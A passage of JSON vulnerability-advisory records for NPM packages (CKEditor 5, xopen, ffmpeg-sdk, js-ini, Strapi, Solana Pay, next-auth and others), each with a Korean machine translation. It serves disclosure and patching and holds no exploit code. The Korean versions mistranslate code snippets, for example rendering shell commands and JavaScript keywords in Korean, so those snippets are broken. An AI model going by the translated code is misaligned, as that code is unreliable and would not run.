    "description": "### Affected packages\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-support\n@ckeditor/ckeditor5-html-embed\n\n### Impact\nA cross-site scripting vulnerability has been discovered affecting three optional CKEditor 5's packages. The vulnerability allowed to trigger a JavaScript code after fulfilling special conditions:\n\na) Using one of the affected packages. In case of `ckeditor5-html-support` and `ckeditor5-html-embed`, additionally, it was required to use a configuration that allows unsafe markup inside the editor,\nb) Initializing the editor on an element and using an element other than `<textarea>` as a base,\nc) Destroying the editor instance.\n\nThe root cause of the issue was a mechanism responsible for updating the source element with the markup coming from the CKEditor 5 data pipeline after destroying the editor. \n\nThis vulnerability might affect a small percent of integrators that depend on dynamic editor initialization/destroy and use [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [General HTML Support](https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) or [HTML embed](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) features.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 35.0.1.\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.\n",
    "identifiers": "GHSA : GHSA-42wq-rch8-6f6j\nCVE : CVE-2022-31175",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:01:23Z",
    "publishedAt": "2022-08-06T09:40:43Z",
    "references": "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-42wq-rch8-6f6j\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31175\nhttps://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/markdown.html\nhttps://github.com/advisories/GHSA-42wq-rch8-6f6j",
    "name": "@ckeditor/ckeditor5-html-embed",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 35.0.1",
    "identifier": "35.0.1",
    "descriptionKR": "### 영향을 받는 패키지\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-지원\n@ckeditor/ckeditor5-html-포함\n\n### 영향\n선택적 CKEditor 5 패키지 3개에 영향을 미치는 교차 사이트 스크립팅 취약점이 발견되었습니다. 특수 조건을 충족한 후 JavaScript 코드를 트리거할 수 있는 취약점:\n\na) 영향을 받는 패키지 중 하나를 사용합니다. `ckeditor5-html-support`와 `ckeditor5-html-embed`의 경우 추가로 에디터 내부에 안전하지 않은 마크업을 허용하는 구성을 사용해야 했고,\nb) 요소에서 편집기를 초기화하고 `<textarea>` 이외의 요소를 기본으로 사용,\nc) 편집기 인스턴스를 파괴합니다.\n\n문제의 근본 원인은 편집기를 제거한 후 CKEditor 5 데이터 파이프라인에서 오는 마크업으로 소스 요소를 업데이트하는 메커니즘이었습니다.\n\n이 취약점은 동적 편집기 초기화/제거에 의존하고 [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [일반 HTML 지원]( https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) 또는 [HTML 삽입](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) html) 기능을 제공합니다.\n\n### 패치\n문제를 인식하고 패치했습니다. 수정 사항은 버전 35.0.1에서 사용할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@cksource.com](mailto:security@cksource.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Affected packages\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-support\n@ckeditor/ckeditor5-html-embed\n\n### Impact\nA cross-site scripting vulnerability has been discovered affecting three optional CKEditor 5's packages. The vulnerability allowed to trigger a JavaScript code after fulfilling special conditions:\n\na) Using one of the affected packages. In case of `ckeditor5-html-support` and `ckeditor5-html-embed`, additionally, it was required to use a configuration that allows unsafe markup inside the editor,\nb) Initializing the editor on an element and using an element other than `<textarea>` as a base,\nc) Destroying the editor instance.\n\nThe root cause of the issue was a mechanism responsible for updating the source element with the markup coming from the CKEditor 5 data pipeline after destroying the editor. \n\nThis vulnerability might affect a small percent of integrators that depend on dynamic editor initialization/destroy and use [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [General HTML Support](https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) or [HTML embed](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) features.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 35.0.1.\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.\n",
    "identifiers": "GHSA : GHSA-42wq-rch8-6f6j\nCVE : CVE-2022-31175",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:01:23Z",
    "publishedAt": "2022-08-06T09:40:43Z",
    "references": "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-42wq-rch8-6f6j\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31175\nhttps://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/markdown.html\nhttps://github.com/advisories/GHSA-42wq-rch8-6f6j",
    "name": "@ckeditor/ckeditor5-html-support",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 35.0.1",
    "identifier": "35.0.1",
    "descriptionKR": "### 영향을 받는 패키지\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-지원\n@ckeditor/ckeditor5-html-포함\n\n### 영향\n선택적 CKEditor 5 패키지 3개에 영향을 미치는 교차 사이트 스크립팅 취약점이 발견되었습니다. 특수 조건을 충족한 후 JavaScript 코드를 트리거할 수 있는 취약점:\n\na) 영향을 받는 패키지 중 하나를 사용합니다. `ckeditor5-html-support`와 `ckeditor5-html-embed`의 경우 추가로 에디터 내부에 안전하지 않은 마크업을 허용하는 구성을 사용해야 했고,\nb) 요소에서 편집기를 초기화하고 `<textarea>` 이외의 요소를 기본으로 사용,\nc) 편집기 인스턴스를 파괴합니다.\n\n문제의 근본 원인은 편집기를 제거한 후 CKEditor 5 데이터 파이프라인에서 오는 마크업으로 소스 요소를 업데이트하는 메커니즘이었습니다.\n\n이 취약점은 동적 편집기 초기화/제거에 의존하고 [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [일반 HTML 지원]( https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) 또는 [HTML 삽입](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) html) 기능을 제공합니다.\n\n### 패치\n문제를 인식하고 패치했습니다. 수정 사항은 버전 35.0.1에서 사용할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@cksource.com](mailto:security@cksource.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Affected packages\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-support\n@ckeditor/ckeditor5-html-embed\n\n### Impact\nA cross-site scripting vulnerability has been discovered affecting three optional CKEditor 5's packages. The vulnerability allowed to trigger a JavaScript code after fulfilling special conditions:\n\na) Using one of the affected packages. In case of `ckeditor5-html-support` and `ckeditor5-html-embed`, additionally, it was required to use a configuration that allows unsafe markup inside the editor,\nb) Initializing the editor on an element and using an element other than `<textarea>` as a base,\nc) Destroying the editor instance.\n\nThe root cause of the issue was a mechanism responsible for updating the source element with the markup coming from the CKEditor 5 data pipeline after destroying the editor. \n\nThis vulnerability might affect a small percent of integrators that depend on dynamic editor initialization/destroy and use [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [General HTML Support](https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) or [HTML embed](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) features.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 35.0.1.\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.\n",
    "identifiers": "GHSA : GHSA-42wq-rch8-6f6j\nCVE : CVE-2022-31175",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:01:23Z",
    "publishedAt": "2022-08-06T09:40:43Z",
    "references": "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-42wq-rch8-6f6j\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31175\nhttps://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html\nhttps://ckeditor.com/docs/ckeditor5/latest/features/markdown.html\nhttps://github.com/advisories/GHSA-42wq-rch8-6f6j",
    "name": "@ckeditor/ckeditor5-markdown-gfm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 35.0.1",
    "identifier": "35.0.1",
    "descriptionKR": "### 영향을 받는 패키지\n@ckeditor/ckeditor5-markdown-gfm\n@ckeditor/ckeditor5-html-지원\n@ckeditor/ckeditor5-html-포함\n\n### 영향\n선택적 CKEditor 5 패키지 3개에 영향을 미치는 교차 사이트 스크립팅 취약점이 발견되었습니다. 특수 조건을 충족한 후 JavaScript 코드를 트리거할 수 있는 취약점:\n\na) 영향을 받는 패키지 중 하나를 사용합니다. `ckeditor5-html-support`와 `ckeditor5-html-embed`의 경우 추가로 에디터 내부에 안전하지 않은 마크업을 허용하는 구성을 사용해야 했고,\nb) 요소에서 편집기를 초기화하고 `<textarea>` 이외의 요소를 기본으로 사용,\nc) 편집기 인스턴스를 파괴합니다.\n\n문제의 근본 원인은 편집기를 제거한 후 CKEditor 5 데이터 파이프라인에서 오는 마크업으로 소스 요소를 업데이트하는 메커니즘이었습니다.\n\n이 취약점은 동적 편집기 초기화/제거에 의존하고 [Markdown](https://ckeditor.com/docs/ckeditor5/latest/features/markdown.html), [일반 HTML 지원]( https://ckeditor.com/docs/ckeditor5/latest/features/general-html-support.html) 또는 [HTML 삽입](https://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html) html) 기능을 제공합니다.\n\n### 패치\n문제를 인식하고 패치했습니다. 수정 사항은 버전 35.0.1에서 사용할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@cksource.com](mailto:security@cksource.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "A vulnerability in Apache SkyWalking NodeJS Agent prior to 0.5.1. The vulnerability will cause NodeJS services that has this agent installed to be unavailable if the OAP is unhealthy and NodeJS agent can't establish the connection.",
    "identifiers": "GHSA : GHSA-8gpg-466c-5cpj\nCVE : CVE-2022-36127",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:47Z",
    "publishedAt": "2022-07-19T00:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-36127\nhttps://lists.apache.org/thread/x238wo4r5goy39dxdjcmlofp6gcdnqr3\nhttp://www.openwall.com/lists/oss-security/2022/07/18/1\nhttps://skywalking.apache.org/events/release-apache-skywalking-nodejs-0-5-1/\nhttps://github.com/advisories/GHSA-8gpg-466c-5cpj",
    "name": "skywalking-backend-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.1",
    "identifier": "0.5.1",
    "descriptionKR": "0.5.1 이전의 Apache SkyWalking NodeJS Agent의 취약점. 취약점으로 인해 OAP가 비정상이고 NodeJS 에이전트가 연결을 설정할 수 없는 경우 이 에이전트가 설치된 NodeJS 서비스를 사용할 수 없게 됩니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package ffmpeg-sdk. The injection point is located in line 9 in index.js.",
    "identifiers": "GHSA : GHSA-rwvf-c3wm-qm6w\nCVE : CVE-2020-28435",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:49Z",
    "publishedAt": "2022-07-26T00:01:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28435\nhttps://security.snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429\nhttps://github.com/CubetLabs/ffmpeg-sdk/blob/master/index.js\nhttps://github.com/shajanjp/ffmpeg-sdk/blob/master/index.js\nhttps://github.com/advisories/GHSA-rwvf-c3wm-qm6w",
    "name": "ffmpeg-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.5",
    "descriptionKR": "명령 주입 취약점은 패키지 ffmpeg-sdk의 모든 버전에 영향을 미칩니다. 주입 지점은 index.js의 9행에 있습니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package xopen. The injection point is located in line 14 in index.js in the exported function `xopen(filepath)`.",
    "identifiers": "GHSA : GHSA-74wf-cwjg-9cf2\nCVE : CVE-2020-28447",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:49Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28447\nhttps://security.snyk.io/vuln/SNYK-JS-XOPEN-1050981\nhttps://github.com/andrewimm/xopen/blob/master/index.js\nhttps://github.com/advisories/GHSA-74wf-cwjg-9cf2",
    "name": "xopen",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "명령 주입 취약점은 패키지 xopen의 모든 버전에 영향을 미칩니다. 주입 지점은 내보낸 함수 `xopen(filepath)`에서 index.js의 14번째 줄에 있습니다."
  },
  {
    "description": "This affects all versions of package ion-parser. If an attacker submits a malicious INI file to an application that parses it with `parse` , they will pollute the prototype on the application. This can be exploited further depending on the context.",
    "identifiers": "GHSA : GHSA-7vrv-5m2h-rjw9\nCVE : CVE-2020-28462",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:47Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28462\nhttps://security.snyk.io/vuln/SNYK-JS-IONPARSER-1048971\nhttps://github.com/advisories/GHSA-7vrv-5m2h-rjw9",
    "name": "ion-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.5.2",
    "descriptionKR": "이것은 패키지 ion-parser의 모든 버전에 영향을 미칩니다. 공격자가 악성 INI 파일을 '구문 분석'으로 구문 분석하는 응용 프로그램에 제출하면 응용 프로그램의 프로토타입을 오염시킵니다. 이는 상황에 따라 추가로 악용될 수 있습니다."
  },
  {
    "description": "This affects the package snyk-broker before 4.73.0. It allows arbitrary file reads for users with access to Snyk's internal network via directory traversal.",
    "identifiers": "GHSA : GHSA-gq75-5gc3-rfwg\nCVE : CVE-2020-7649",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:25Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7649\nhttps://github.com/snyk/broker/commit/90e0bac07a800b7c4c6646097c9c89d6b878b429\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570608\nhttps://updates.snyk.io/snyk-broker-security-fixes-152338\nhttps://github.com/snyk/broker/releases/tag/v4.73.0\nhttps://github.com/advisories/GHSA-gq75-5gc3-rfwg",
    "name": "snyk-broker",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.73.0",
    "identifier": "4.73.0",
    "descriptionKR": "이는 4.73.0 이전 패키지 snyk-broker에 영향을 미칩니다. 디렉토리 순회를 통해 Snyk의 내부 네트워크에 액세스할 수 있는 사용자가 임의의 파일을 읽을 수 있습니다."
  },
  {
    "description": "This affects all versions of package markdown-it-toc. The title of the generated toc and the contents of the header are not escaped.",
    "identifiers": "GHSA : GHSA-wfvx-fx73-3rfj\nCVE : CVE-2020-28455",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:30Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28455\nhttps://security.snyk.io/vuln/SNYK-JS-MARKDOWNITTOC-1044067\nhttps://github.com/advisories/GHSA-wfvx-fx73-3rfj",
    "name": "markdown-it-toc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.0",
    "descriptionKR": "이는 markdown-it-toc 패키지의 모든 버전에 영향을 미칩니다. 생성된 toc의 제목과 헤더의 내용은 이스케이프되지 않습니다."
  },
  {
    "description": "This affects the package js-ini before 1.3.0. If an attacker submits a malicious INI file to an application that parses it with `parse` , they will pollute the prototype on the application. This can be exploited further depending on the context.",
    "identifiers": "GHSA : GHSA-m939-vrfp-9v8p\nCVE : CVE-2020-28461",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:47Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28461\nhttps://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e\nhttps://security.snyk.io/vuln/SNYK-JS-JSINI-1048970\nhttps://github.com/advisories/GHSA-m939-vrfp-9v8p",
    "name": "js-ini",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.0",
    "identifier": "1.3.0",
    "descriptionKR": "이는 1.3.0 이전 패키지 js-ini에 영향을 미칩니다. 공격자가 악성 INI 파일을 '구문 분석'으로 구문 분석하는 응용 프로그램에 제출하면 응용 프로그램의 프로토타입을 오염시킵니다. 이는 상황에 따라 추가로 악용될 수 있습니다."
  },
  {
    "description": "This affects all versions of package node-import. The `params` argument of module function can be controlled by users without any sanitization. This is then provided to the “eval” function located in line 79 in the index file `index.js`.",
    "identifiers": "GHSA : GHSA-pc62-cq5x-3j5g\nCVE : CVE-2020-7678",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:06Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7678\nhttps://github.com/mahdaen/node-import/blob/master/index.js%23L79\nhttps://security.snyk.io/vuln/SNYK-JS-NODEIMPORT-571691\nhttps://github.com/advisories/GHSA-pc62-cq5x-3j5g",
    "name": "node-import",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.2",
    "descriptionKR": "이것은 패키지 node-import의 모든 버전에 영향을 미칩니다. 모듈 함수의 `params` 인수는 사용자가 어떤 위생 처리 없이 제어할 수 있습니다. 그런 다음 색인 파일 `index.js`의 79행에 있는 \"eval\" 함수에 제공됩니다."
  },
  {
    "description": "The package otp-generator before 3.0.0 are vulnerable to Insecure Randomness due to insecure generation of random one-time passwords, which may allow a brute-force attack.",
    "identifiers": "GHSA : GHSA-6x93-h9g3-9phr\nCVE : CVE-2021-23451",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:19Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23451\nhttps://github.com/Maheshkumar-Kakade/otp-generator/issues/12\nhttps://github.com/Maheshkumar-Kakade/otp-generator/commit/b27de1ce439ae7f533cec26677e9698671275b70\nhttps://security.snyk.io/vuln/SNYK-JS-OTPGENERATOR-1655480\nhttps://github.com/advisories/GHSA-6x93-h9g3-9phr",
    "name": "otp-generator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.0",
    "identifier": "3.0.0",
    "descriptionKR": "3.0.0 이전 패키지 otp-generator는 무차별 대입 공격을 허용할 수 있는 임의의 일회용 암호의 안전하지 않은 생성으로 인해 안전하지 않은 무작위성에 취약합니다."
  },
  {
    "description": "All versions of package set-deep-prop are vulnerable to Prototype Pollution via the main functionality.",
    "identifiers": "GHSA : GHSA-v42q-78w8-8fcc\nCVE : CVE-2021-23373",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:19Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23373\nhttps://security.snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231\nhttps://github.com/advisories/GHSA-v42q-78w8-8fcc",
    "name": "set-deep-prop",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "패키지 set-deep-prop의 모든 버전은 기본 기능을 통해 Prototype Pollution에 취약합니다."
  },
  {
    "description": "The package grapesjs before 0.19.5 is vulnerable to Cross-site Scripting (XSS) due to an improper sanitization of the class name in Selector Manager.",
    "identifiers": "GHSA : GHSA-589f-c66p-hxr4\nCVE : CVE-2022-21802",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:31Z",
    "publishedAt": "2022-07-26T00:01:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21802\nhttps://github.com/artf/grapesjs/issues/4411%23issuecomment-1167202709\nhttps://github.com/artf/grapesjs/commit/13e85d152d486b968265c4b8017e8901e7d89ff3\nhttps://github.com/artf/grapesjs/releases/tag/v0.19.5\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2936781\nhttps://security.snyk.io/vuln/SNYK-JS-GRAPESJS-2935960\nhttps://github.com/advisories/GHSA-589f-c66p-hxr4",
    "name": "grapesjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.19.5",
    "descriptionKR": "0.19.5 이전의 grapesjs 패키지는 Selector Manager에서 클래스 이름의 부적절한 삭제로 인해 XSS(Cross-site Scripting)에 취약합니다."
  },
  {
    "description": "An unrestricted file upload vulnerability in the Add New Assets function of Strapi v4.1.12 allows attackers to execute arbitrary code via a crafted file. After an authenticated attacker uploads a file containing a malicious URL, a victim copies and pastes the malicious URL into a new tab to receive the XSS payload.",
    "identifiers": "GHSA : GHSA-4vm8-j95f-j6v5\nCVE : CVE-2022-32114",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:06:24Z",
    "publishedAt": "2022-07-14T00:00:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-32114\nhttps://github.com/bypazs/strapi\nhttps://grimthereaperteam.medium.com/strapi-v4-1-12-unrestricted-file-upload-b993bfd07e4e\nhttps://github.com/advisories/GHSA-4vm8-j95f-j6v5",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.1.12",
    "descriptionKR": "Strapi v4.1.12의 새 자산 추가 기능의 무제한 파일 업로드 취약성으로 인해 공격자가 조작된 파일을 통해 임의의 코드를 실행할 수 있습니다. 인증된 공격자가 악성 URL이 포함된 파일을 업로드한 후 피해자는 악성 URL을 복사하여 새 탭에 붙여넣어 XSS 페이로드를 수신합니다."
  },
  {
    "description": "### Description\nWhen a Solana Pay transaction is located using a [reference key](https://github.com/solana-labs/solana-pay/blob/master/SPEC.md#reference), it may be checked to represent a transfer of the desired amount to the recipient, using the supplied [`validateTransfer` function](https://github.com/solana-labs/solana-pay/blob/master/core/src/validateTransfer.ts). An edge case regarding this mechanism could cause the validation logic to validate multiple transfers.\n\n### Impact\nMost known Solana Pay point of sale applications are currently run on physical point of sale devices, which makes this issue unlikely to occur. However, there may be web-based point of sale applications using the protocol where it may be more likely to occur.\n\n### Patches\nThis issue has been patched as of version [`0.2.1`](https://www.npmjs.com/package/@solana/pay/v/0.2.1). Users of the Solana Pay SDK should upgrade to it.",
    "identifiers": "GHSA : GHSA-j47c-j42c-mwqq\nCVE : CVE-2022-35917",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:08:37Z",
    "publishedAt": "2022-08-06T05:39:18Z",
    "references": "https://github.com/solana-labs/solana-pay/security/advisories/GHSA-j47c-j42c-mwqq\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35917\nhttps://github.com/solana-labs/solana-pay/commit/ac6ce0d0a81137700874a8bf5a7caac3be999fad\nhttps://github.com/solana-labs/solana-pay/blob/master/SPEC.md#reference\nhttps://github.com/solana-labs/solana-pay/blob/master/core/src/validateTransfer.ts\nhttps://github.com/advisories/GHSA-j47c-j42c-mwqq",
    "name": "@solana/pay",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.0",
    "identifier": "0.2.1",
    "descriptionKR": "### 설명\n[참조 키](https://github.com/solana-labs/solana-pay/blob/master/SPEC.md#reference)를 사용하여 솔라나 페이 거래가 확인되면 제공된 [`validateTransfer` 함수](https://github.com/solana-labs/solana-pay/blob/master/core/src/validateTransfer.ts)를 사용하여 원하는 금액을 수신자에게 보냅니다. 이 메커니즘과 관련된 엣지 케이스로 인해 유효성 검사 논리가 여러 전송의 유효성을 검사할 수 있습니다.\n\n### 영향\n대부분의 알려진 Solana Pay POS 애플리케이션은 현재 물리적 POS 장치에서 실행되므로 이 문제가 발생할 가능성이 낮습니다. 그러나 발생할 가능성이 더 높은 프로토콜을 사용하는 웹 기반 POS 애플리케이션이 있을 수 있습니다.\n\n### 패치\n이 문제는 버전 [`0.2.1`](https://www.npmjs.com/package/@solana/pay/v/0.2.1)에서 패치되었습니다. Solana Pay SDK 사용자는 업그레이드해야 합니다."
  },
  {
    "description": "### Impact\nAn information disclosure vulnerability in `next-auth` before `v4.10.2` and `v3.29.9` allows an attacker with log access privilege to obtain excessive information such as an identity provider's secret in the log (which is thrown during OAuth error handling) and use it to leverage further attacks on the system, like impersonating the client to ask for extensive permissions.\n\n### Patches\nWe patched this vulnerability in `v4.10.2` and `v3.29.9` by moving the log for `provider` information to the debug level. In addition, we added a warning for having the `debug: true` option turned on in production and documented it [here](https://next-auth.js.org/warnings#debug_enabled).\n> You have enabled the debug option. It is meant for development only, to help you catch issues in your authentication flow and you should consider removing this option when deploying to production. One way of only allowing debugging while not in production is to set debug: process.env.NODE_ENV !== \"production\", so you can commit this without needing to change the value.\n> \n> If you want to log debug messages during production anyway, we recommend setting the [logger option](https://next-auth.js.org/configuration/options#logger) with proper sanitization of potentially sensitive user information.\n\nTo upgrade:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n# or\npnpm add next-auth@latest\n```\n(This will update to the latest v4 version, but you can change `latest` to 3 if you want to stay on v3. This is not recommended. v3 is unmaintained.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, you can user the `logger` configuration option by sanitizing the logs:\n```ts\n// Example\nimport log from \"your-logging-service\"\nexport const authOptions: NextAuthOptions = {\n  debug: process.env.NODE_ENV !== \"production\",\n  logger: {\n    error: (code, metadata) => {\n      if (!(metadata instanceof Error) &&  metadata.provider) {\n        // redact the provider secret here\n        delete metadata.provider\n        log.error(code, metadata)\n      } else {\n        log.error(code, metadata)\n      }\n    }\n  },\n}\n```\n\n### References\nRelated documentation:\n- https://next-auth.js.org/warnings#debug_enabled\n- https://next-auth.js.org/configuration/options#logger \n- https://next-auth.js.org/getting-started/upgrade-v4\n\n### For more information\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\nThe issue was reported 18th of July, a response was sent out in less than 20 minutes and after identifying the issue a patch was published within a week.",
    "identifiers": "GHSA : GHSA-p6mm-27gq-9v3p\nCVE : CVE-2022-31186",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:07:15Z",
    "publishedAt": "2022-08-06T05:29:45Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-p6mm-27gq-9v3p\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31186\nhttps://next-auth.js.org/configuration/options#logger\nhttps://next-auth.js.org/getting-started/upgrade-v4\nhttps://next-auth.js.org/warnings#debug_enabled\nhttps://github.com/advisories/GHSA-p6mm-27gq-9v3p",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.10.2",
    "identifier": "4.10.2",
    "descriptionKR": "### 영향\n`v4.10.2` 및 `v3.29.9` 이전 `next-auth`의 정보 공개 취약성으로 인해 로그 액세스 권한이 있는 공격자가 로그에서 ID 공급자의 비밀과 같은 과도한 정보를 얻을 수 있습니다(OAuth 오류 처리 중에 발생함). ) 광범위한 권한을 요청하기 위해 클라이언트를 가장하는 것과 같이 시스템에 대한 추가 공격을 활용하는 데 사용합니다.\n\n### 패치\n`provider` 정보에 대한 로그를 디버그 수준으로 이동하여 `v4.10.2` 및 `v3.29.9`에서 이 취약점을 패치했습니다. 또한 프로덕션에서 `debug: true` 옵션을 켜는 것에 대한 경고를 추가하고 [여기](https://next-auth.js.org/warnings#debug_enabled)에 문서화했습니다.\n> 디버그 옵션을 활성화했습니다. 이는 인증 흐름에서 문제를 파악하는 데 도움이 되는 개발 전용이며 프로덕션에 배포할 때 이 옵션을 제거하는 것을 고려해야 합니다. 생산 중이 아닌 동안에만 디버깅을 허용하는 한 가지 방법은 debug: process.env.NODE_ENV !== \"production\"을 설정하는 것이므로 값을 변경할 필요 없이 이를 커밋할 수 있습니다.\n>\n> 어쨌든 프로덕션 중에 디버그 메시지를 기록하려면 [로거 옵션](https://next-auth.js.org/configuration/options#logger)을 잠재적으로 민감한 사용자 정보를 적절하게 삭제하도록 설정하는 것이 좋습니다.\n\n업그레이드하려면:\n\n```쉬\nnpm i next-auth@latest\n# 또는\n원사 추가 next-auth@latest\n# 또는\npnpm add next-auth@latest\n```\n(최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 3으로 변경할 수 있습니다. 권장하지 않습니다. v3는 유지 관리되지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 로그를 삭제하여 `logger` 구성 옵션을 사용할 수 있습니다.\n```ts\n// 예\n\"your-logging-service\"에서 로그 가져오기\n내보내기 const authOptions: NextAuthOptions = {\n  디버그: process.env.NODE_ENV !== \"프로덕션\",\n  로거: {\n    오류: (코드, 메타데이터) => {\n      if (!(metadata instanceof Error) && metadata.provider) {\n        // 여기에서 제공자 비밀을 수정합니다.\n        메타데이터 삭제.제공자\n        log.error(코드, 메타데이터)\n      } 또 다른 {\n        log.error(코드, 메타데이터)\n      }\n    }\n  },\n}\n```\n\n### 참조\n관련 문서:\n- https://next-auth.js.org/warnings#debug_enabled\n- 